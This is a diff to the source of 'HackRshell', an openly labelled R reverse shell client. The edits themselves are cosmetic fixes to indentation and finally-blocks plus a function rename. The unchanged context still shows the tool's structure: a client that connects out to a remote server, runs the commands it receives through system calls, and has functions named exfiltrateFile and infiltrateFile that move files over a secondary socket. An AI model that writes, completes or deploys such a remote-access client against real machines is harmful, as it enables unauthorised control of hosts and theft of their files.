@@ -1,19 +1,19 @@
-    # HackRshell, an R reverse shell program - Client side function.
-    # Copyright (C) 2022 Ian Roberts
+# HackRshell, an R reverse shell program - Client side function.
+# Copyright (C) 2022 Ian Roberts
 
-    # This library is free software; you can redistribute it and/or
-    # modify it under the terms of the GNU Lesser General Public
-    # License as published by the Free Software Foundation; either
-    # version 2.1 of the License, or (at your option) any later version.
+# This library is free software; you can redistribute it and/or
+# modify it under the terms of the GNU Lesser General Public
+# License as published by the Free Software Foundation; either
+# version 2.1 of the License, or (at your option) any later version.
 
-    # This library is distributed in the hope that it will be useful,
-    # but WITHOUT ANY WARRANTY; without even the implied warranty of
-    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
-    # Lesser General Public License for more details.
+# This library is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# Lesser General Public License for more details.
 
-    # You should have received a copy of the GNU Lesser General Public
-    # License along with this library; if not, write to the Free Software
-    # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
+# You should have received a copy of the GNU Lesser General Public
+# License along with this library; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 
 #Helper function, closes {con} without a warning message if
 #connection is null, which is initially is in this program.
@@ -35,8 +35,8 @@ genericWarningMessage <- function(w){
 listFiles <- function() {
   toServer <- tryCatch({
     paste(dir(all.files = TRUE), collapse="%&%")
-    }, error=genericErrorMessage, warning=genericWarningMessage
-    )
+  }, error=genericErrorMessage, warning=genericWarningMessage
+  )
   return(toServer)
 }
 
@@ -78,7 +78,7 @@ catTextFile <- function(rawCommand, command) {
     targetFile <- file(fileName, "r", encoding="utf-8")
     paste(readLines(targetFile, warn=FALSE), collapse="%&%")
   }, error=genericErrorMessage, warning=genericWarningMessage,
-  finally=function() {
+  finally={
     safeClose(targetFile)
   })
   return(toServer)
@@ -116,7 +116,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
   }, warning=function(w){
     abortDownload <<- TRUE
     paste("Warning: ", w$message)
-  }, finally=function(){
+  }, finally={
     safeClose(targetFile)
   })
   exfilSocket <- NULL
@@ -129,7 +129,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
     }, error=function(e){
       paste("Client error transmitting file: ", e$message)
     }, warning=genericWarningMessage,
-    finally=function(){
+    finally={
       safeClose(exfilSocket)
     })
   } else { #Error message
@@ -159,7 +159,7 @@ infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
   }, warning=function(w){
     abortUpload <<- TRUE
     paste("Warning: ", w$message)
-  }, finally=function(){
+  }, finally={
     safeClose(uploadSocket)
   })
   if(!abortUpload) {
@@ -171,7 +171,7 @@ infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
     }, error=function(e){
       paste("Error writing received data: ", e$message)
     }, warning=genericWarningMessage,
-    finally=function(){
+    finally={
       safeClose(outFile)
     })
   } else { #Error occurred
@@ -190,7 +190,7 @@ makeSystemCall <- function(rawCommand, command) {
 }
 
 
-client <- function(host="localhost", port=4471, secondaryPort=5472) {
+hRs.client <- function(host="localhost", port=4471, secondaryPort=5472) {
   socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=86400, open="r+")
 
   #Ensures that the socket gets closed silently, even if program fails
@@ -199,7 +199,7 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
   exiting <- FALSE
   toServer <- "Connected"
   while(!exiting) {
-#    print(toServer)
+    #    print(toServer)
     writeLines(as.character(toServer), socket)
     rawCommand <- readLines(socket, 1)
     if (identical(rawCommand, character(0))) {
@@ -242,5 +242,7 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
     }
   }
   close(socket)
-#  print("Socket closed")
+  #  print("Socket closed")
 }
+
+
